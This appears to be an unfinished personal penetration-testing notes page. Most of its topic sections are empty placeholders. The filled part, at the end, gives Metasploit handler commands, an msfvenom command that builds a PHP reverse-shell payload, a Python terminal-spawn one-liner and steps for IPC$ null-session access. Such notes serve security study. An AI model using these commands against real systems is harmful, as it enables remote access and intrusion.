---
layout: page
title: "/brainbox"
permalink: /brainbox/
---


<details open><summary> <b>API</b> </summary><blockquote>
  <details><summary>REST</summary><blockquote>
    :smile:
  </blockquote></details>
  <details open><summary>SOAP</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>


<details open><summary> <b>WEB</b> </summary><blockquote>
    <br/>
Start with automated tools to search for low hanging fruits 
   Burpsuite Scanner
   OWASP Zap 
   Accunetix
   Nikto 
   
   
  <details><summary>SQLi</summary><blockquote>
    :smile:
  </blockquote></details>
  <details open><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details open><summary>SSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details open><summary>IDOR</summary><blockquote>
    :smile:
  </blockquote></details>
    <details open><summary>XSS</summary><blockquote>
    :smile:
  </blockquote></details>
    <details open><summary>BAC</summary><blockquote>
        Broken Access Control
    :smile:
  </blockquote></details>
    <details open><summary>XXE</summary><blockquote>
    :smile:
  </blockquote></details>
    <details open><summary>SDE</summary><blockquote>
        secure data exposure
    :smile:
  </blockquote></details>
    <details open><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details open><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details open><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details open><summary> <b>MOBILE</b> </summary><blockquote>
  <details><summary>Android</summary><blockquote>
    :smile:
  </blockquote></details>
  <details open><summary>iOS</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details open><summary> <b>NIX</b> </summary><blockquote>
  <details><summary>Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
  <details open><summary>Privilege Escalation</summary><blockquote>
    :smile:
  </blockquote></details>
    <details open><summary>Post Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details open><summary> <b>WINDOWS</b> </summary><blockquote>
  <details><summary>Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
  <details open><summary>Privilege Escalation</summary><blockquote>
    :smile:
  </blockquote></details>
    <details open><summary>Post Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>ACTIVE-DIRECTORY</b> </summary>
    <details><summary>Initial Access</summary>
        content 1.1
    </details>
    <details><summary>Local Privilege Escalation</summary>
        content 1.2
    </details>
  <details><summary>Post Exploitation</summary>
        content 1.2
    </details>
    <details><summary>Lateral Movement</summary>
        content 1.2
    </details>
    <details><summary>Clearing Tracks</summary>
        content 1.2
    </details>
</details>

<br/>

<details open><summary> <b>CLOUD</b> </summary><blockquote>
  <details><summary>AZURE</summary><blockquote>
    :smile:
  </blockquote></details>
  <details open><summary>AWS</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details> 
  <summary> <b>Shells</b> </summary>
</details>


<br/>



<details open><summary> <b>SHELLS</b> </summary><blockquote>
  <details><summary>Reverse Shells</summary><blockquote>
    :smile:
  </blockquote></details>
  <details open><summary>Web Shells</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

## Metasploit
#### ./ Handlers

```bash 
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD <Payload name>
msf6 > set LHOST <LHOST value>
msf6 > set LPORT <LPORT value>
msf6 > set ExitOnSession false
msf6 > exploit -j -z
```
<br/>
Once the required values are completed the following command will execute your handler: ‘msfconsole -L -r' 
<br/>
<br/>

#### ./ Scripting Payloads
PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port-address> -o shell.php
```

<br/>

## Python
#### ./ Spawn a terminal

```python
python -c 'import pty;pty.spawn("/bin/bash")';
```
<details> 
  <summary> <b>Checking for Null Sessions</b> </summary>

To verify that, we will exploit the IPC$ administrative share by trying to connect to it without valid credentials.

To connect, you have to type the following command in a Windows shell:

```bash
> NET USE \\<target IP address>\IPC$ '' /u:''
```

This tells Windows to connect to the IPC$ share by using an empty password and an empty username!

Let's try the command on our target:

<br/>
<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%">
<br/>


The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
  
Example:
<br/>
<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
<br/>
You can also perform the very same checks by using smbclient:
<br/>
<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
</details>
